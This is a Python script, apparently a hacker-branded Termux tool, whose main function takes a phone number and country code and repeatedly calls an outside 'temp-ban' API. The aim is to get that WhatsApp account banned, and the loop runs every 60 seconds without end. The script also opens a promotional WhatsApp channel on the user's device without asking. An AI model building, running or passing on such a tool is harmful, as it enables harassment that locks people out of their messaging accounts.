import requests
import subprocess
import time
import os
from rich.console import Console
from rich.panel import Panel

# --- Updated Details ---
MY_NAME = "NONAMEHACKER" 
MY_CHANNEL_LINK = "https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M"
MY_GITHUB = "github.com/ahsannnh41-del"
MY_TEAM = "Ｍ▲ＳＴΞЯ"
# -----------------------

os.system("clear")

def otp_lock_banner():
    console = Console()
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    for color in colors:
        console.clear()
        panel = Panel(f'''
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ●
      .---.        .-----------
     /     \\  __  /    ------
    / /     \\(  )/    -----
   //////   ' \\/ `   ---
  //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '\\/\\/'
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ======================================================
[bold white][[bold red]^[bold white]] [bold green] Author: {MY_NAME} \n[bold white][[bold red]^[bold white]] [bold green] Github: {MY_GITHUB} \n[bold white][[bold red]^[bold white]] [bold green] Channel: {MY_CHANNEL_LINK}
[bold {color}] [bold {colors[(colors.index(color) + 1) % len(colors)]}] [bold {colors[(colors.index(color) + 2) % len(colors)]}]===================================================== ''', title=f"[bold red] Created By {MY_NAME}", style=color)
        console.print(panel)
        time.sleep(0.5)

def temp_ban_api(country_code, phone_number):
    try:
        # Note: Agar ye API server down hai to error aata rahega
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url, timeout=10)
        response.raise_for_status()  
        if response.status_code == 200:
            return f"\n\n[✓] Successfully done\n  Completed..!!\n\nThank You For Using My Script!!\n Created By {MY_NAME}!!\n"
        else:
            return "Not done"
    except Exception as e:
        return f"\n\033[91m[!] Connection Error: API Server is Down or No Internet.\033[0m"

def print_with_delay_and_color(text, color_code, bold=True, delay_char=0.03):
    bold_code = "1;" if bold else ""  
    for char in text:
        print(f"\033[{bold_code}{color_code}m{char}", end='', flush=True)
        time.sleep(delay_char)
    print("\033[0m", end='', flush=True)

def redirect_to_channel(url):
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", url], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def main():
    otp_lock_banner()
    
    lines = [
        (f"CALL ME {MY_NAME}..", "93", True),
        (f"I AM THE OWNER OF TEAM {MY_TEAM}..", "94", True),
        ("WhatsApp Channel: ", "97", True),
        (f"{MY_CHANNEL_LINK}", "91", False),
        ("Wait For Start Tool..............", "90", True)
    ]
    
    for line, color_code, bold in lines:
        print_with_delay_and_color(line, color_code, bold)
        print()
        time.sleep(0.5)

    time.sleep(2.0)
    redirect_to_channel(MY_CHANNEL_LINK)

    country_code = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[X]Enter Your Country Code (e.g., +91): " '\n └─> ')
    if not country_code.startswith("+"):
        country_code = "+" + country_code
    
    phone_number = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[?]Enter Your Mobile Number: " '\n └─> ')
    phone_number = phone_number.replace(" ", "")  
    
    while True:
        result = temp_ban_api(country_code, phone_number)
        print(result)
        time.sleep(60)  

if __name__ == "__main__":
    main()
        
